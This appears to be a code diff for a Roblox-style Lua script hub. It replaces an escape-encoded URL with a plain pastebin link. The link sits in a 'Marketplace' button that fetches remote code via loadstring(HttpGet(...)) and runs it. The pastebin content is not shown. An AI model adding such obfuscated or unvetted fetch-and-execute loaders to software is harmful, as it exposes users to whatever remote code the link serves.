@@ -108,7 +108,6 @@ local function ResolveContainers()
     end
     return false
 end
-local url = mor
 
 local function GetOptimalColumn()
     local cCol = State.GUIColumns["Center"]
@@ -175,7 +174,7 @@ local function CreateSandboxedEnv(apiObject)
     })
     return UserEnv
 end
-local mor = "\104\116\116\112\115\058\047\047\112\097\115\116\101\098\105\110\046\099\111\109\047\114\097\119\047\106\077\078\090\100\065\082\109"
+
 function LuauAPI:UnloadScript(name)
     local data = State.LoadedScripts[name]
     if not data then return end
@@ -404,7 +403,7 @@ ControlSection:AddButton({
     ControlSection:AddButton({
         Name = "Marketplace",
         Callback = function()
-          loadstring(game:HttpGet(url))()
+            loadstring(game:HttpGet("https://pastebin.com/raw/jMNZdARm"))()
         end
     })
 end
